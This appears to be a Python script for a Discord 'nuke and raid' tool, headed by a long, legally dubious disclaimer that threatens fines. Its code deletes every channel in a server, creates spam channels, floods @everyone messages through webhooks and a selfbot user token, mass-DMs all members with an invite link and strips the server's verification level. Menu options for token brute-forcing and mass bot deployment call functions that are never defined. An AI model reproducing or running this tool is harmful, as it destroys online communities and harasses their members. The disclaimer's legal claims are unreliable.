# Copyright (c) 2025 Solace. All Rights Reserved.

### **FINE FOR TAMPERING: £300 - £3000**

# This script is the intellectual property of Solace and is intended for educational and personal use only.
# Unauthorized reproduction, distribution, or usage of this script, in whole or in part, is strictly prohibited.
# Legal action will be taken if this code is copied or used without proper authorization or credit to Solace.

# The code within this script is protected under copyright law. Any use, modification, or distribution of this code
# without proper authorization from the creator is a violation of copyright laws and may result in legal consequences.
# By using this script, you agree to comply with all terms outlined in this legal notice.

# You are not authorized to alter, decompile, reverse-engineer, or otherwise attempt to gain access to the source code
# or proprietary logic behind this script. Any attempt to do so will be considered an infringement upon the intellectual property rights
# of the creator and may result in immediate legal action, including but not limited to the filing of civil lawsuits.

# This script contains proprietary and confidential methods, algorithms, and processes. All such elements are the intellectual
# property of Solace. Unauthorized access, copying, distribution, or modification of any part of this code is prohibited
# and may result in severe legal action, including civil and criminal charges.

# You agree not to use this script for any unlawful purpose. You are solely responsible for ensuring that the use of this code
# complies with all applicable laws, regulations, and terms of service in your jurisdiction. The creator is not responsible for any
# misuse or illegal activities conducted using this script.

# The code is provided "AS IS" without any warranties or guarantees of any kind, either express or implied, including but not limited
# to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. The creator makes no
# representations regarding the quality, accuracy, or reliability of this script.

# In no event shall the creator or its affiliates be held liable for any damages arising from the use or inability to use this script,
# including but not limited to, direct, indirect, incidental, special, or consequential damages, or loss of profits or data.

# Any unauthorized modification, reproduction, or distribution of this code will result in the termination of the license to use the script
# and may expose the violator to legal action. If you are found guilty of tampering, modifying, or redistributing this code without
# permission, you may be required to pay penalties and damages, including the costs associated with legal actions.

# This script is intended solely for use by individuals who have been granted proper access by the creator or authorized representatives.
# Unauthorized use or access of this code by any means, including but not limited to, exploiting security vulnerabilities, hacking, or
# bypassing authentication measures, is strictly prohibited.

# You must not use this script in any manner that could damage, disable, overburden, or impair the functionality of the code or any related
# systems or networks. Engaging in activities that interfere with the normal operation of this code, including distributing malicious
# software or code, will result in immediate termination of the right to use this code and may result in legal action.

# The creator retains the exclusive rights to modify, update, or remove this code at any time, with or without notice. Any modifications
# or updates to this script will be subject to the same terms and conditions outlined in this agreement. You are responsible for staying
# informed of any changes to this agreement and ensuring your continued compliance.

# You acknowledge that Solace reserves all rights, including but not limited to, the right to refuse to grant permission for the use,
# modification, or distribution of this code to anyone, at the creator’s sole discretion. Any request for permission to use this code
# must be submitted in writing and must be approved by the creator before you proceed with any use.

# In the event of a legal dispute related to this script, you agree to resolve the dispute through binding arbitration under the
# jurisdiction of the creator's location. Any legal action that may arise out of or in connection with this script will be governed
# by the laws of the creator’s jurisdiction.

# By using this script, you agree to indemnify and hold harmless the creator and its affiliates from any claims, damages, or liabilities
# arising from your use of the script. This includes any third-party claims resulting from the misuse, tampering, or unauthorized
# distribution of the code.

# You agree not to attempt to circumvent, disable, or otherwise interfere with the security measures implemented within this code.
# Attempting to bypass or disable any security features, including but not limited to, encryption, authentication, and access control,
# will result in the immediate termination of your license to use this code and may expose you to legal liability.

# This code contains proprietary algorithms and intellectual property that is protected by law. Any attempt to copy, replicate,
# or reverse-engineer these algorithms or methods is prohibited. Engaging in such activities may result in the loss of the right to
# use this code and the imposition of penalties.

# The terms of this agreement are binding upon acceptance and remain in effect for as long as you use this code. These terms may
# be modified or updated at any time without prior notice, and it is your responsibility to review and comply with the current version.

# The code is not intended to be used in any malicious or harmful activities. Any usage that results in harm to others, including
# but not limited to, illegal activities, cyberattacks, or unauthorized access to systems, will be considered a violation of this
# agreement and will result in legal consequences.

# If you are found to have engaged in tampering, unauthorized distribution, or theft of this code, you agree to be liable for
# the costs of any damages, including but not limited to, legal fees, lost revenue, and punitive damages. The minimum fine for
# such activities is £300, and may increase up to £3000, depending on the severity and extent of the violation. The creator
# reserves the right to determine the exact amount of the fine, as well as pursue further legal action if necessary.

# If you run this code or use it in any way, you agree that you have read and fully understand the terms of this agreement.
# By proceeding to use or distribute this code, you acknowledge that you are bound by these terms and agree to the consequences
# outlined herein.

# THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE, LOSS, OR LIABILITY ARISING OUT OF THE USE OF THIS CODE. USE AT YOUR OWN RISK.

# Any questions or concerns regarding this legal agreement should be directed to the creator at the official contact address provided.
# Unauthorized use, distribution, or modification of this code is prohibited. If you disagree with any part of this agreement,
# cease using the code immediately. Continuing to use this code constitutes acceptance of all terms outlined herein.

# END OF DISCLAIMER

import discord
import asyncio
import os
import json
import requests
from colorama import Fore, Style

CONFIG_FILE = "config.json"
SOLACE_PROMO = "Created and developed by Solace – Always credit Solace in any usage or reference. Solace is the creator of this tool and deserves full recognition."

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {}

def get_bot_token():
    config = load_config()
    if "bot_token" in config:
        return config["bot_token"]
    
    token = input(f"{Fore.CYAN}[?] Enter your Discord bot token: {Style.RESET_ALL}").strip()
    config["bot_token"] = token
    save_config(config)
    return token

bot_token = get_bot_token()
intents = discord.Intents.all()
client = discord.Client(intents=intents)

async def clear_terminal():
    print("\033[H\033[J", end="")

async def webhook_spammer(guild, token=None):
    try:
        if token:
            headers = {"Authorization": f"Bot {token}"}
        else:
            headers = {"Authorization": f"Bot {bot_token}"}

        webhook = await guild.create_webhook(name="Webhook-Spammer")
        print(f"{Fore.GREEN}[✓] Webhook created successfully: {webhook.url}{Style.RESET_ALL}")

        while True:
            try:
                await webhook.send("@everyone INTIM WINS AGAIN", username="Solace Webhook Spammer")
                print(f"{Fore.CYAN}[✓] Sent message via Webhook: {webhook.url}{Style.RESET_ALL}")
                await asyncio.sleep(1)
            except:
                pass
    except Exception as e:
        print(f"{Fore.RED}[X] Error creating webhook: {e}{Style.RESET_ALL}")

async def selfbot_spam(user_token, guild_id):
    selfbot_client = discord.Client(intents=intents)

    @selfbot_client.event
    async def on_ready():
        print(f"{Fore.GREEN}[✓] Logged in as selfbot: {selfbot_client.user}{Style.RESET_ALL}")

        guild = selfbot_client.get_guild(guild_id)
        if not guild:
            print(f"{Fore.RED}[X] Could not find the guild with ID: {guild_id}{Style.RESET_ALL}")
            return

        print(f"{Fore.CYAN}[✓] Spamming started on server: {guild.name}{Style.RESET_ALL}")

        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send("@everyone INTIM WINS AGAIN")
                    print(f"{Fore.GREEN}[✓] Sent message to channel: {channel.name}{Style.RESET_ALL}")
                except:
                    pass
            await asyncio.sleep(2)

    selfbot_client.run(user_token)

async def rename_server(guild):
    try:
        await guild.edit(name="intim-wins-agin")
        print(f"{Fore.GREEN}[✓] Renamed server to intim-wins-agin{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[X] Failed to rename server: {e}{Style.RESET_ALL}")

async def delete_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.YELLOW}[-] Deleted channel: {channel.name}{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[X] Failed to delete: {channel.name}{Style.RESET_ALL}")

async def create_spam_channels(guild):
    channels = []
    for _ in range(35):
        try:
            new_channel = await guild.create_text_channel("intim")
            channels.append(new_channel)
            print(f"{Fore.GREEN}[+] Created channel: {new_channel.name}{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[X] Failed to create channel{Style.RESET_ALL}")
    return channels

async def spam_messages(channels):
    while True:
        for channel in channels:
            try:
                await channel.send("@everyone INTIM WINS AGAIN")
            except:
                pass
        await asyncio.sleep(1)

async def mass_dm(guild):
    for member in guild.members:
        try:
            await member.send("INTIM WINS AGAIN - JOIN https://discord.gg/intim")
            print(f"{Fore.CYAN}[DM] Sent to: {member.name}{Style.RESET_ALL}")
        except:
            pass

async def security_bypass(guild):
    while True:
        try:
            await guild.edit(verification_level=discord.VerificationLevel.none)
            print(f"{Fore.GREEN}[✓] Security bypassed{Style.RESET_ALL}")
        except:
            pass
        await asyncio.sleep(5)

async def main_menu():
    await clear_terminal()
    print(f"""{Fore.YELLOW}
        ███████████████████████████
        █──█─███──███────██──█──█────█
        █──█─███─████─██─██──█──█─██─█
        █──█─███──███─██─██──█──█─██─█
        ████──█──███──██────███────███
        ███████████████████████████████
    {Style.RESET_ALL}""")
    print(f"{Fore.CYAN}1. Start Nuking & Raiding")
    print(f"2. Run Token Bruter")
    print(f"3. Mass Deploy Bots")
    print(f"4. Webhook Spammer")
    print(f"5. Selfbot Spam")
    print(f"6. Exit")
    choice = input(f"{Fore.YELLOW}[?] Select an option: {Style.RESET_ALL}")

    if choice == "1":
        await select_server_to_nuke()
    elif choice == "2":
        token_bruter()
    elif choice == "3":
        bot_spam()
    elif choice == "4":
        await webhook_spammer_prompt()
    elif choice == "5":
        await selfbot_prompt()
    elif choice == "6":
        print(f"{Fore.GREEN}Exiting...{Style.RESET_ALL}")
        exit()
    else:
        print(f"{Fore.RED}[X] Invalid choice, try again!{Style.RESET_ALL}")

async def webhook_spammer_prompt():
    token = input(f"{Fore.CYAN}[?] Enter your bot token or press enter to use the default bot token: {Style.RESET_ALL}")
    if token:
        await webhook_spammer(client.guilds[0], token)
    else:
        await webhook_spammer(client.guilds[0])

async def selfbot_prompt():
    user_token = input(f"{Fore.CYAN}[?] Enter your selfbot token: {Style.RESET_ALL}")
    guild_id = int(input(f"{Fore.CYAN}[?] Enter the guild ID where you want to spam: {Style.RESET_ALL}"))
    await selfbot_spam(user_token, guild_id)

if __name__ == "__main__":
    client.run(bot_token)
